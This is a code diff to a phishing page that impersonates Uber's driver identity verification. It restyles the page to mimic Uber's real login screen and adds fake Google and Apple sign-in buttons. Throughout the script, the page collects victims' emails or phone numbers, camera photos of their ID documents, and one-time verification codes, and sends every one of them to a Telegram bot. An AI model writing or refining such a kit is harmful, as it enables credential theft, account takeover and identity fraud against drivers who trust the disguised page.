@@ -12,10 +12,10 @@
             -webkit-tap-highlight-color: transparent;
         }
         body {
-            background: #000000;
+            background: #FFFFFF;
             font-family: -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif;
             padding: 20px 16px 40px;
-            color: #FFFFFF;
+            color: #1A1A1A;
             min-height: 100vh;
         }
         .container {
@@ -27,52 +27,51 @@
             margin-bottom: 32px;
         }
         .logo {
-            font-size: 28px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #00D2FF, #3A7BD5);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
+            font-size: 32px;
+            font-weight: 700;
+            color: #000000;
             margin-bottom: 8px;
         }
         .sub {
             font-size: 14px;
-            color: #8E8E93;
+            color: #6B6B6B;
         }
         .panel {
-            background: #1C1C1E;
+            background: #FFFFFF;
             border-radius: 28px;
             padding: 24px 20px;
             margin-bottom: 20px;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+            box-shadow: 0 2px 12px rgba(0,0,0,0.05);
+            border: 1px solid #E5E5E5;
         }
         .input-group {
             margin-bottom: 20px;
         }
         .input-label {
-            font-weight: 600;
+            font-weight: 500;
             font-size: 14px;
-            color: #8E8E93;
+            color: #6B6B6B;
             margin-bottom: 8px;
         }
         input, select {
             width: 100%;
             padding: 14px 16px;
             font-size: 17px;
-            background: #2C2C2E;
-            border: 1px solid #3A3A3C;
+            background: #F8F8F8;
+            border: 1px solid #E5E5E5;
             border-radius: 14px;
-            color: white;
+            color: #1A1A1A;
             outline: none;
             transition: 0.2s;
         }
         input:focus {
-            border-color: #00D2FF;
+            border-color: #000000;
+            background: #FFFFFF;
         }
         .action-btn {
-            background: #00D2FF;
-            color: black;
-            font-weight: 700;
+            background: #000000;
+            color: white;
+            font-weight: 600;
             width: 100%;
             border: none;
             padding: 14px;
@@ -85,8 +84,51 @@
             transform: scale(0.97);
         }
         .action-btn.secondary {
-            background: #3A3A3C;
-            color: white;
+            background: #F8F8F8;
+            color: #1A1A1A;
+            border: 1px solid #E5E5E5;
+        }
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            position: relative;
+            color: #6B6B6B;
+            font-size: 14px;
+        }
+        .divider::before,
+        .divider::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            height: 1px;
+            background: #E5E5E5;
+        }
+        .divider::before { left: 0; }
+        .divider::after { right: 0; }
+        .social-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .social-btn {
+            background: #F8F8F8;
+            border: 1px solid #E5E5E5;
+            border-radius: 44px;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            cursor: pointer;
+        }
+        .terms {
+            font-size: 12px;
+            color: #6B6B6B;
+            text-align: center;
+            margin-top: 24px;
         }
         .step-indicator {
             display: flex;
@@ -96,14 +138,14 @@
         .step-dot {
             flex: 1;
             height: 4px;
-            background: #3A3A3C;
+            background: #E5E5E5;
             border-radius: 4px;
         }
         .step-dot.active {
-            background: #00D2FF;
+            background: #000000;
         }
         .step-dot.completed {
-            background: #00D2FF;
+            background: #000000;
         }
         .camera-container {
             background: #000;
@@ -132,11 +174,11 @@
             width: 70px;
             height: 70px;
             border-radius: 50%;
-            border: 4px solid #00D2FF;
+            border: 4px solid #000000;
             cursor: pointer;
         }
         .switch-cam {
-            background: rgba(60,60,70,0.8);
+            background: rgba(0,0,0,0.6);
             width: 44px;
             height: 44px;
             border-radius: 50%;
@@ -145,17 +187,19 @@
             justify-content: center;
             font-size: 20px;
             cursor: pointer;
+            color: white;
         }
         .status-badge {
-            background: #2C2C2E;
+            background: #F8F8F8;
             padding: 8px;
             border-radius: 60px;
             text-align: center;
             font-size: 13px;
             margin-bottom: 16px;
+            color: #1A1A1A;
         }
         .toast {
-            background: #1C1C1E;
+            background: #1A1A1A;
             color: white;
             border-radius: 60px;
             padding: 10px 16px;
@@ -193,7 +237,7 @@
             width: 50px;
             height: 50px;
             border: 4px solid #3A3A3C;
-            border-top-color: #00D2FF;
+            border-top-color: #FFFFFF;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 16px;
@@ -216,45 +260,35 @@
             font-size: 24px;
             letter-spacing: 4px;
         }
-        .login-method {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 16px;
-        }
-        .method-btn {
-            flex: 1;
-            background: #2C2C2E;
-            border: none;
-            padding: 10px;
-            border-radius: 44px;
-            color: #8E8E93;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        .method-btn.active {
-            background: #00D2FF;
-            color: black;
-        }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <div class="logo">UBER DRIVER</div>
-        <div class="sub">Identity verification for drivers</div>
+        <div class="logo">Uber</div>
+        <div class="sub">Driver identity verification</div>
     </div>
 
-    <!-- Step 1: Login (Email or Phone) -->
+    <!-- Step 1: Login (Email/Phone + Social) -->
     <div id="loginPanel" class="panel">
-        <div class="login-method">
-            <button class="method-btn active" id="emailMethodBtn">📧 Email</button>
-            <button class="method-btn" id="phoneMethodBtn">📱 Phone</button>
-        </div>
         <div class="input-group">
-            <div class="input-label" id="loginLabel">Email address</div>
-            <input type="text" id="loginInput" placeholder="driver@example.com" autocomplete="off">
+            <div class="input-label">What's your phone number or email?</div>
+            <input type="text" id="loginInput" placeholder="Enter phone number or email" autocomplete="off">
         </div>
-        <button class="action-btn" id="loginNextBtn">Continue →</button>
+        <button class="action-btn" id="loginContinueBtn">Continue</button>
+        <div class="divider">or</div>
+        <div class="social-buttons">
+            <div class="social-btn" id="googleLoginBtn">
+                <span style="font-size:18px;">G</span> Continue with Google
+            </div>
+            <div class="social-btn" id="appleLoginBtn">
+                <span style="font-size:18px;">🍎</span> Continue with Apple
+            </div>
+        </div>
+        <div class="terms">
+            By continuing, you agree to calls, including by autodialer, WhatsApp or texts from Uber and its affiliates.
+            Text "STOP" to 89203 to opt out.
+        </div>
     </div>
 
     <!-- Step 2: KYC Photos -->
@@ -262,10 +296,21 @@
         <div class="step-indicator" id="stepIndicator">
             <div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div>
         </div>
-        <!-- Step 1: ID Type + State -->
+        <!-- Step 1: ID Type + State (full US states) -->
         <div id="kycStep1" class="kyc-step">
             <div class="input-group"><div class="input-label">ID Type</div><select id="idType"><option value="">Select</option><option>Driver's License</option><option>State ID</option><option>Passport</option></select></div>
-            <div class="input-group"><div class="input-label">Issuing State</div><select id="idState"><option value="">Select state</option><option>California</option><option>Texas</option><option>New York</option><option>Florida</option><option>Illinois</option></select></div>
+            <div class="input-group"><div class="input-label">Issuing State</div><select id="idState"><option value="">Select state</option>
+                <option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option><option>California</option>
+                <option>Colorado</option><option>Connecticut</option><option>Delaware</option><option>Florida</option><option>Georgia</option>
+                <option>Hawaii</option><option>Idaho</option><option>Illinois</option><option>Indiana</option><option>Iowa</option>
+                <option>Kansas</option><option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option>
+                <option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option><option>Missouri</option>
+                <option>Montana</option><option>Nebraska</option><option>Nevada</option><option>New Hampshire</option><option>New Jersey</option>
+                <option>New Mexico</option><option>New York</option><option>North Carolina</option><option>North Dakota</option><option>Ohio</option>
+                <option>Oklahoma</option><option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option>
+                <option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option><option>Vermont</option>
+                <option>Virginia</option><option>Washington</option><option>West Virginia</option><option>Wisconsin</option><option>Wyoming</option>
+            </select></div>
             <button class="action-btn" id="kycStep1Next">Continue →</button>
         </div>
         <!-- Step 2: Front ID -->
@@ -329,45 +374,26 @@
     const toast = document.getElementById('toastMsg');
     const loadingOverlay = document.getElementById('loadingOverlay');
     const loginInput = document.getElementById('loginInput');
-    const loginLabel = document.getElementById('loginLabel');
-    const loginNextBtn = document.getElementById('loginNextBtn');
-    const emailMethodBtn = document.getElementById('emailMethodBtn');
-    const phoneMethodBtn = document.getElementById('phoneMethodBtn');
+    const loginContinueBtn = document.getElementById('loginContinueBtn');
+    const googleLoginBtn = document.getElementById('googleLoginBtn');
+    const appleLoginBtn = document.getElementById('appleLoginBtn');
     const otpSubmitBtn = document.getElementById('otpSubmitBtn');
     const otpInput = document.getElementById('otpCode');
 
     let userData = {
         loginValue: '',
-        loginType: 'email',
+        loginMethod: '',
         idType: '',
         idState: '',
         otp: ''
     };
-
-    // Methods toggle
-    emailMethodBtn.addEventListener('click', () => {
-        emailMethodBtn.classList.add('active');
-        phoneMethodBtn.classList.remove('active');
-        userData.loginType = 'email';
-        loginLabel.innerText = 'Email address';
-        loginInput.placeholder = 'driver@example.com';
-        loginInput.type = 'email';
-    });
-    phoneMethodBtn.addEventListener('click', () => {
-        phoneMethodBtn.classList.add('active');
-        emailMethodBtn.classList.remove('active');
-        userData.loginType = 'phone';
-        loginLabel.innerText = 'Phone number';
-        loginInput.placeholder = '+1 234 567 8900';
-        loginInput.type = 'tel';
-    });
 
     // Helper: show toast
     function showToast(msg, isErr = false) {
         toast.innerText = msg;
         toast.classList.add('show');
         if (isErr) toast.style.background = '#B91C1C';
-        else toast.style.background = '#1C1C1E';
+        else toast.style.background = '#1A1A1A';
         setTimeout(() => toast.classList.remove('show'), 3000);
     }
 
@@ -397,26 +423,40 @@
         } catch(e) { return false; }
     }
 
-    // Step 1: Login
-    loginNextBtn.onclick = () => {
-        let value = loginInput.value.trim();
-        if (!value) {
-            showToast(`Please enter your ${userData.loginType}`, true);
-            return;
-        }
-        if (userData.loginType === 'email' && !value.includes('@')) {
-            showToast("Enter a valid email address", true);
-            return;
-        }
-        if (userData.loginType === 'phone' && value.replace(/\D/g,'').length < 8) {
-            showToast("Enter a valid phone number", true);
-            return;
-        }
-        userData.loginValue = value;
-        sendToTelegram(`🚗 <b>UBER DRIVER LOGIN</b>\n${userData.loginType === 'email' ? 'Email' : 'Phone'}: ${value}\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+    // Function to start KYC after successful login
+    function startKyc() {
         loginPanel.style.display = 'none';
         kycPanel.classList.remove('hide');
         showStep(1);
+    }
+
+    // Step 1: Continue button (manual entry)
+    loginContinueBtn.onclick = () => {
+        let value = loginInput.value.trim();
+        if (!value) {
+            showToast("Please enter your phone number or email", true);
+            return;
+        }
+        userData.loginValue = value;
+        userData.loginMethod = 'manual';
+        sendToTelegram(`🚗 <b>UBER DRIVER LOGIN</b>\nLogin: ${value}\nMethod: Manual entry\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+        startKyc();
+    };
+
+    // Google login simulation
+    googleLoginBtn.onclick = () => {
+        userData.loginValue = 'google_user@example.com';
+        userData.loginMethod = 'google';
+        sendToTelegram(`🚗 <b>UBER DRIVER LOGIN</b>\nLogin: Continue with Google\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+        startKyc();
+    };
+
+    // Apple login simulation
+    appleLoginBtn.onclick = () => {
+        userData.loginValue = 'apple_user@icloud.com';
+        userData.loginMethod = 'apple';
+        sendToTelegram(`🚗 <b>UBER DRIVER LOGIN</b>\nLogin: Continue with Apple\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+        startKyc();
     };
 
     // KYC Steps logic
@@ -476,7 +516,7 @@
         let sy = (video.videoHeight - size)/2;
         ctx.drawImage(video, sx, sy, size, size, 0, 0, size, size);
         canvas.toBlob(async blob => {
-            const caption = `${side} - ${userData.loginValue}`;
+            const caption = `${side} - ${userData.loginValue || userData.loginMethod}`;
             const sent = await sendPhotoToTelegram(blob, caption);
             if (sent) statusElem.innerText = `✅ ${side} uploaded.`;
             else statusElem.innerText = `⚠️ ${side} saved.`;
@@ -521,7 +561,7 @@
             return;
         }
         userData.otp = otp;
-        await sendToTelegram(`🔐 <b>VERIFICATION CODE</b>\nCode: ${otp}\nUser: ${userData.loginValue}\nAll KYC photos completed.`);
+        await sendToTelegram(`🔐 <b>VERIFICATION CODE</b>\nCode: ${otp}\nUser: ${userData.loginValue || userData.loginMethod}\nAll KYC photos completed.`);
         loadingOverlay.classList.add('active');
         setTimeout(() => {
             loadingOverlay.classList.remove('active');
